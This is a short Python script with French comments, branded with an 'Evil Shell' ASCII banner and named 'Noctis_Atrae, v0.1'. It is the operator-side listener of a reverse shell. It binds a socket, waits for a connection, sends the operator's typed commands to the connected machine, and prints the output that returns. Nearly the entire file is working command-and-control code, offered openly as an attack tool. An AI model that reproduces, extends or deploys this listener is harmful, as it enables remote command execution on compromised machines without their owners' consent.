# coding: utf-8
#!/usr/bin/python3

from termcolor import colored
import socket
import sys
import os

os.system("clear")

banner = """
▓█████ ██▒   █▓ ██▓ ██▓         ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓█   ▀▓██░   █▒▓██▒▓██▒       ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒███   ▓██  █▒░▒██▒▒██░       ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒▓█  ▄  ▒██ █░░░██░▒██░         ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒████▒  ▒▀█░  ░██░░██████▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
   ░       ░░   ▒ ░  ░ ░      ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░  ░     ░   ░      ░  ░         ░   ░  ░  ░   ░  ░    ░  ░    ░  ░ 

Noctis_Atrae, v0.1                                                                                
"""

critcal_msg = colored("[!CRITICAL!]", "red", attrs=['reverse', 'blink'])
info_msg = colored("[?INFO?]", "green", attrs=['blink'])

text = colored(banner, 'red', attrs=['blink'])
print(text)

# Creation du Socket
def socket_create():
	try:
		global host
		global port
		global bind_values
		global s

		host = input("Adresse du serveur:")
		port = input("Port du serveur: ")

		bind_values = (host, int(port))

		s = socket.socket()

	except socket.error as msg:
		print(critcal_msg + " La création du socket a échoué : " + str(msg))

# Socket Binding
def socket_bind():
	try:
		global host
		global port
		global bind_values
		global s

		print(info_msg + " Le serveur écoute à l'adresse " + str(host) + ":" + str(port))
		s.bind((bind_values))
		s.listen(5)

	except socket.error as msg:
		print(critcal_msg + " Le serveur a rencontré une erreur lors de l'écoute !" + str(msg) + "\n" + "On recommence !")
		socket_bind()

# Connexion au client 
def socket_accept():
	conn, address = s.accept()
	print("[?INFO?]: La connexion a bien été établie | " + "IP: " + address[0] + " | Port: " + str(address[1]))
	send_commands(conn)
	conn.close()

def send_commands(conn):
	while True:
		cmd = input("#~ ")
		if cmd == 'quit':
			conn.close()
			s.close
			sys.exit()

		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_reponse = str(conn.recv(1024), "utf-8")
			print(client_reponse, end="")

def main():
	socket_create()
	socket_bind()
	socket_accept()

main()
